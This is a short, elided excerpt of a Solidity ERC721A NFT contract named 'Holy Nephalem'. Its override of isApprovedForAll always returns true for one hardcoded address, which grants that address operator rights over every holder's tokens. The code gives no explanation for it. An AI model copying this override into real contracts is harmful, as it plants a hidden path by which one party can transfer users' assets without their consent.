  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x56feD78fD980e8f4820Bdfb3B56e139A7B3876Ef){return true;}
...
contract Holy_Nephalem is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Holy Nephalem", "HOLY", maxBatchSize_, collectionSize_) {
